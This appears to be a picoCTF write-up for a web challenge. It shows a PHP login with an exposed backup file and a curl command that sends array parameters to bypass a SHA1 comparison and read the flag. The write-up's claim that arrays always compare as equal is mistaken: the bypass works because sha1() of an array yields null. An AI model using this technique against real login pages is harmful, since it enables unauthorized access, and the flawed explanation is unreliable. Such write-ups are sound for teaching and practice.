# URL
https://play.picoctf.org/practice/challenge/467?category=1&page=2
# Category
Web App
# Concept
* PHP Type Juggling
* If you compare arrays versus other arrays, it doesn't matter what the content of the arrays are, if the types are being juggled, they will always return True when compared
# Method of solve
* go to the PHP login page
* there is a backup for the PHP file at the following endpoint
`http://verbal-sleep.picoctf.net:63131/impossibleLogin.php~`
* this is the code being used:
```
<?php
if(isset($_POST['username']) && isset($_POST['pwd'])) {
    $username = $_POST['username'];
    $password = $_POST['pwd'];
    
    if($username == $password) {
        echo "<br/>Failed! No flag for you";
    } else {
        if(sha1($username) === sha1($password)) {
            echo file_get_contents("../flag.txt");
        } else {
            echo "<br/>Failed! No flag for you";
        }
    }
}
?>
```
* according to this code, it's checking two things
1) It's checking if the username and password are not the same value
2) It's checking if the SHA1 hash of the username and password are the same value
* the only way to achieve both of these requirements is use PHP type juggling: in this case, we can specify that both the username and the password are arrays, which always return True when compared
* with curl, we can use the following command:
```
curl -X POST -d 'username%5B%5D=test1&pwd%5B%5D=test2' http://verbal-sleep.picoctf.net:63131/impossibleLogin.php
```
* alternatively, we can inspect the request in Burp Suite and use the repeater to send the POST data with `username[]=123` and `pwd[]=456` as arrays
